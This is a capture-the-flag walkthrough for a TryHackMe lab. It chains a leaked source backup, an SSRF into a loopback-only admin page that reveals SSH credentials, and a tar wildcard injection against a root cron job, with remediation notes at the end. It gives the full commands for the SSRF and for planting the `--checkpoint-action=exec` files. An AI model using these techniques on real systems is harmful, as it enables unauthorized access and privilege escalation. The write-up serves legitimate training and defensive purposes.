# TryHackMe: Operation Coldstart — Walkthrough

**Date:** 2026-10-29
**Room:** Operation Coldstart
**Analyst:** Will Lawson
**Category:** Web (SSRF) / Linux Privilege Escalation
**Target:** 10.146.158.183

---

## Scenario

Volt Labs, a small SaaS shop, suspected an old staging server had rotted into an exposed liability. Mara assigned me the engagement: find a way in and demonstrate full compromise. Two flags to recover — `user.txt` and `flag.txt`.

**Flags:**
- `user.txt`: `THM{96dc7bd50d2fb98fcece01560788b5ab}`
- `flag.txt` (root): `THM{e6ee84a483d67ade06936fcfd1433e8a}`

---

## Recon

I started with a full-range service scan rather than the top-1000 default — a "server everyone left behind" is exactly the kind of box that parks a forgotten service on an odd port, and I didn't want to miss it.

```bash
nmap -sC -sV -p- -T4 10.146.158.183
```

Three ports, all low and ordinary-looking:

```
21/tcp open  ftp     vsftpd 3.0.5
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 May 09 23:14 pub
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    Gunicorn
|_http-title: URL Preview - Volt Labs
```

Two things jumped out. The FTP banner already advertised **anonymous login allowed** with a `pub` directory — free loot, so I'd check that first. And the web app was a **"URL Preview" service** on Gunicorn. A tool whose whole job is "give me a URL and I'll fetch it for you" is an SSRF waiting to happen; I had a strong feeling that was the real front door. SSH I set aside — that's where creds get *used*, not usually where they're *found*.

---

## FTP — the leftover backup

Grabbed the anonymous share non-interactively so I'd have a local copy of whatever was there:

```bash
wget -r --no-parent ftp://anonymous:anonymous@10.146.158.183/
```

One file: `pub/backup.tar.gz`, only 2.4K. Too small to be a data dump — that size says source code or config. Unpacked it:

```bash
mkdir -p ~/coldstart && tar -xzvf 10.146.158.183/pub/backup.tar.gz -C ~/coldstart && ls -laR ~/coldstart
```

```
voltlabs-preview/
voltlabs-preview/requirements.txt
voltlabs-preview/README.md
voltlabs-preview/app.py
```

The full source for the web app. That's the best possible find this early — I didn't have to guess at the preview feature's behavior, I could read exactly how it handled input.

---

## Source review — the SSRF and the admin gate

`cat app.py` laid the whole thing out. Two routes mattered.

**`/preview`** — the URL fetcher. The developer had clearly *thought* about SSRF and added an allow-list, but the check was shallow:

```python
ALLOWED_HOSTS = {"kestrel.thm"}
# Internal hostname resolves to 127.0.0.1 via /etc/hosts on this box.
...
host = (urlparse(target).hostname or "").lower()
if host not in ALLOWED_HOSTS:
    return ... 403
r = requests.get(target, timeout=3)
```

The only validation was the **hostname**. No scheme check, no path check. And by the app's own comment, `kestrel.thm` resolves to `127.0.0.1` on the box. So any URL of the form `http://kestrel.thm/<anything>` would pass the allow-list and be fetched *by the server, from itself*.

**`/admin/`** — gated purely on source IP:

```python
@app.route("/admin/<path:p>")
def admin(p="index"):
    if not request.remote_addr.startswith("127."):
        abort(403)
    if p == "notes":
        with open("/opt/voltlabs-preview/admin_notes.txt") as f:
            return "<pre>" + f.read() + "</pre>"
```

That's the whole chain in two routes. The admin endpoint trusts anything coming from `127.*`. The preview endpoint *is* the thing that makes requests from `127.*`. I could use the SSRF to reach `/admin/notes` — the request would originate from the server's own loopback, sail past the IP check, and hand me `admin_notes.txt`.

---

## Exploiting the SSRF → admin notes

```bash
curl -s "http://10.146.158.183/preview?url=http://kestrel.thm/admin/notes"
```

Server-side, `requests.get("http://kestrel.thm/admin/notes")` ran with `remote_addr = 127.0.0.1`, the admin gate passed, and the notes file came back embedded in the preview `<pre>`:

```
=== INTERNAL ===
SSH access for staging:
  user: webdev
  pass: V0ltLabs#summer
- Mara
```

Staging SSH credentials, left in an admin note. Exactly the kind of thing a rotted staging box accumulates.

---

## Foothold — SSH as webdev

```bash
ssh webdev@10.146.158.183   # V0ltLabs#summer
```

In on the first try. Grabbed the user flag and checked my standing immediately:

```bash
id; cat ~/user.txt; sudo -l
```

```
uid=1001(webdev) gid=1001(webdev) groups=1001(webdev)
THM{96dc7bd50d2fb98fcece01560788b5ab}
Sorry, user webdev may not run sudo on coldstart.
```

**user.txt done.** No sudo rights, no extra groups — a bare, unprivileged account. Time to hunt for privesc.

---

## Privilege escalation

### Dead end: SUID binaries

My first instinct on any Linux box is the SUID sweep — it's the cheapest check with the highest hit rate:

```bash
find / -perm -4000 -type f 2>/dev/null
```

The list was long but entirely *noise*: every entry was either standard system SUID (`su`, `sudo`, `mount`, `passwd`, `newgrp`, `pkexec`, `ssh-keysign`…) or the same set duplicated across a dozen mounted snap cores. Nothing custom, nothing on GTFOBins that I didn't already know was a non-starter here. No SUID path. On to scheduled jobs.

### The cron vector

"Left behind" plus the app living under `/opt/` made me suspect a forgotten root cron operating out of `/opt`. I checked root-scheduled jobs and what was parked in `/opt` and its permissions together:

```bash
cat /etc/crontab; ls -la /etc/cron.d/ 2>/dev/null; ls -la /opt/ 2>/dev/null
```

Two things lined up:

```
/etc/cron.d/voltlabs-backup
/opt/backups   drwxrwx---  webdev webdev   # I own this directory
```

A custom backup cron, and a backup directory owned by *me*. Read the job:

```bash
cat /etc/cron.d/voltlabs-backup
```

```
* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

Root, every minute, running `tar czf ... *` inside a directory I control. That's the textbook **tar wildcard injection**. When the shell expands `*`, any filename that begins with `--` gets handed to `tar` as a command-line *option* rather than a file. `tar`'s `--checkpoint` / `--checkpoint-action` options let you run an arbitrary command — so by creating files *named* like those flags, I make root's own tar invocation execute my code.

### Planting the payload

I chose to copy root's flag out to my writable directory rather than pop a shell or `chmod` `/root` — minimal footprint, and it's all the engagement needed to demonstrate root-level file read.

```bash
cd /opt/backups && \
echo 'cp /root/flag.txt /opt/backups/flag.txt && chmod 644 /opt/backups/flag.txt' > runme.sh && \
chmod +x runme.sh && \
touch -- '--checkpoint=1' '--checkpoint-action=exec=sh runme.sh'
```

What each piece does when the cron fires:
- `runme.sh` — the actual payload, copying the root flag somewhere I can read it.
- `--checkpoint=1` — tells tar to trigger a checkpoint after the first record.
- `--checkpoint-action=exec=sh runme.sh` — at that checkpoint, run `sh runme.sh` **as root**.

Then I waited for the next minute tick and looked:

```bash
ls -la /opt/backups/flag.txt && cat /opt/backups/flag.txt
```

```
-rw-r--r-- 1 root root 38 Oct 29 15:33 /opt/backups/flag.txt
THM{e6ee84a483d67ade06936fcfd1433e8a}
```

The file was owned by **root** and copied by root's cron — full root-level code execution demonstrated. **flag.txt done.**

---

## Cleanup

Removed the planted artifacts so the box wasn't left littered with my `--checkpoint` files (which would otherwise keep feeding into every subsequent backup run):

```bash
cd /opt/backups && rm -f -- runme.sh flag.txt '--checkpoint=1' '--checkpoint-action=exec=sh runme.sh'
```

---

## Full Attack Chain

```
nmap → 21 (anon FTP), 22 (SSH), 80 (URL Preview / Gunicorn)
  │
Anonymous FTP → pub/backup.tar.gz → voltlabs-preview app source
  │
Source review:
  • /preview SSRF — allow-list checks hostname only; kestrel.thm → 127.0.0.1
  • /admin/<path> — trusts any request from 127.*
  │
SSRF: /preview?url=http://kestrel.thm/admin/notes
  → request originates from loopback → admin gate passes
  → leaks admin_notes.txt → webdev / V0ltLabs#summer
  │
SSH as webdev → user.txt   (no sudo, no SUID vector)
  │
/etc/cron.d/voltlabs-backup → root runs `tar czf ... *` in /opt/backups (webdev-owned)
  → tar wildcard injection via --checkpoint-action=exec
  → root copies flag.txt → flag.txt
```

---

## Key Techniques & Gotchas

| Technique | Detail |
|-----------|--------|
| **Anonymous FTP recon** | A 2.4K `backup.tar.gz` was app *source*, not data — reading it turned the web exploit from guesswork into a code review |
| **Shallow SSRF allow-list** | Validating only `urlparse().hostname` is useless when the allowed host resolves to loopback; the fetch still comes from the server |
| **IP-trust + SSRF combo** | The `/admin` `127.*` check and the `/preview` SSRF are each weak alone; chained, the SSRF *becomes* the trusted localhost caller |
| **SUID sweep as elimination** | Long `find -perm -4000` output was all snap-core duplicates + standard binaries — confirming a dead end fast is as useful as finding the vector |
| **tar wildcard injection** | `tar ... *` with attacker-controlled filenames → `--checkpoint-action=exec` runs commands as whoever owns the cron (root) |
| **Writable dir + root cron** | The real giveaway was ownership: `/opt/backups` was `webdev`-owned *and* a root job ran inside it |

---

## Remediation Notes (for the report to Volt Labs)

1. **Decommission the staging server** — it should never have been externally reachable. This is the root cause.
2. **Anonymous FTP** — disable, or at minimum never stage source/backups in a world-readable share.
3. **SSRF** — validate the resolved IP after DNS resolution (block loopback/link-local/RFC1918), not just the hostname string; don't rely on an allow-list whose entry points at 127.0.0.1.
4. **Admin auth** — gate `/admin` on real authentication, not source IP. Loopback is not a trust boundary when the app itself makes outbound requests.
5. **Secrets in notes** — plaintext SSH creds in an admin notes file is the pivot that made this trivial. Use a secrets manager; rotate `webdev`.
6. **tar backup job** — never `tar ... *`; use `tar czf archive.tgz -C /opt/backups .` or pass an explicit file list, and `--` before the glob. Don't run a backup as root over a directory a low-priv user can write to.
